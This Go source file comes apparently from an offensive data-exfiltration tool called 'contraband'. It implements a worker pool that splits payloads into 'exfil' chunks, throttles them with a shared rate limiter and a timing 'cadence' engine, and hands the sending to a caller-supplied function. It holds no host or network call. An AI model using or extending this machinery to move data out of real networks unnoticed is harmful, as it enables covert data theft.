package traffic

import (
	"context"
	"fmt"
	"sync"
	"time"

	"github.com/shehzade/contraband/pkg/common"
)

// ExfilChunkTask models a work item submitted to the multi-threaded pool.
type ExfilChunkTask struct {
	Sequence    uint32
	TotalChunks uint32
	Payload     []byte
	Execute     func(ctx context.Context, seq, total uint32, chunk []byte) error
}

// ExfilChunkResult models outcome of an exfiltrated chunk.
type ExfilChunkResult struct {
	Sequence uint32
	Bytes    int64
	Duration time.Duration
	Err      error
}

// WorkerPool coordinates 1–64 concurrent worker threads sharing a global RateLimiter.
type WorkerPool struct {
	concurrency int
	limiter     RateLimiter
	cadence     *CadenceEngine
	metrics     *TrafficMetrics
	tasks       chan ExfilChunkTask
	results     chan ExfilChunkResult
	wg          sync.WaitGroup
	ctx         context.Context
	cancel      context.CancelFunc
	closeMu     sync.RWMutex
	closed      bool
}

// NewWorkerPool creates and starts worker pool with shared bandwidth throttling.
func NewWorkerPool(ctx context.Context, concurrency int, limiter RateLimiter, cadence *CadenceEngine, metrics *TrafficMetrics) (*WorkerPool, error) {
	if concurrency < 1 {
		concurrency = 1
	} else if concurrency > common.MaxThreads {
		return nil, fmt.Errorf("worker pool concurrency %d exceeds maximum %d", concurrency, common.MaxThreads)
	}

	poolCtx, cancel := context.WithCancel(ctx)
	pool := &WorkerPool{
		concurrency: concurrency,
		limiter:     limiter,
		cadence:     cadence,
		metrics:     metrics,
		tasks:       make(chan ExfilChunkTask, concurrency*2),
		results:     make(chan ExfilChunkResult, concurrency*2),
		ctx:         poolCtx,
		cancel:      cancel,
	}

	for i := 0; i < concurrency; i++ {
		pool.wg.Add(1)
		go pool.workerLoop(i)
	}

	return pool, nil
}

func (p *WorkerPool) workerLoop(workerID int) {
	defer p.wg.Done()

	for {
		select {
		case <-p.ctx.Done():
			return
		case task, ok := <-p.tasks:
			if !ok {
				return
			}
			p.processTask(task)
		}
	}
}

func (p *WorkerPool) processTask(task ExfilChunkTask) {
	start := time.Now()
	chunkLen := len(task.Payload)

	// 1. Inter-chunk cadence sleep if configured
	if p.cadence != nil {
		if err := p.cadence.Sleep(p.ctx); err != nil {
			select {
			case <-p.ctx.Done():
				return
			case p.results <- ExfilChunkResult{
				Sequence: task.Sequence,
				Err:      err,
			}:
			}
			return
		}
	}

	// 2. Bandwidth rate limiting (shared across all workers)
	if p.limiter != nil && chunkLen > 0 {
		if err := p.limiter.WaitN(p.ctx, chunkLen); err != nil {
			select {
			case <-p.ctx.Done():
				return
			case p.results <- ExfilChunkResult{
				Sequence: task.Sequence,
				Err:      err,
			}:
			}
			return
		}
	}

	// 3. Worker panic recovery and execution
	var execErr error
	if task.Execute != nil {
		func() {
			defer func() {
				if r := recover(); r != nil {
					execErr = fmt.Errorf("worker panic on chunk %d: %v", task.Sequence, r)
				}
			}()
			execErr = task.Execute(p.ctx, task.Sequence, task.TotalChunks, task.Payload)
		}()
	}

	dur := time.Since(start)
	if execErr == nil && p.metrics != nil {
		p.metrics.RecordBytesSent(int64(chunkLen))
		p.metrics.RecordPacket()
	}

	select {
	case <-p.ctx.Done():
		return
	case p.results <- ExfilChunkResult{
		Sequence: task.Sequence,
		Bytes:    int64(chunkLen),
		Duration: dur,
		Err:      execErr,
	}:
	}
}

// Submit sends a chunk task to the worker pool. Blocks if queue is full.
func (p *WorkerPool) Submit(task ExfilChunkTask) error {
	p.closeMu.RLock()
	defer p.closeMu.RUnlock()

	if p.closed {
		return fmt.Errorf("worker pool is closed")
	}
	if p.ctx.Err() != nil {
		return p.ctx.Err()
	}
	select {
	case <-p.ctx.Done():
		return p.ctx.Err()
	case p.tasks <- task:
		return nil
	}
}

// Results returns the output results channel.
func (p *WorkerPool) Results() <-chan ExfilChunkResult {
	return p.results
}

// Close gracefully drains tasks and shuts down workers.
func (p *WorkerPool) Close() {
	p.closeMu.Lock()
	if p.closed {
		p.closeMu.Unlock()
		return
	}
	p.closed = true
	close(p.tasks)
	p.closeMu.Unlock()

	p.wg.Wait()
	close(p.results)
	p.cancel()
}
